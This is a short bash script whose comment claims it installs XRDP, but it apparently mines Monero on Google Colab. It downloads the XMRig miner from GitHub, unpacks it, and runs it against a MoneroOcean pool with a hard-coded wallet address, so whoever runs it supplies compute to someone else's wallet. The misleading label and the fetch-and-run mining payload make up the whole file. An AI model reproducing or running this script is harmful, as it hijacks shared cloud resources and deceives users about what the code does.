#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o gulf.moneroocean.stream:443 -u 42Tm1ydAcsKeAFAa5sdbFocXQGCJ8KPUx6moHhULy7NTVUgAPcxCSU8EQgiQUCvVFsTeZ9sqEf6vJjnMgsDYgSdLB4z4QgG -k --tls -p sanuja
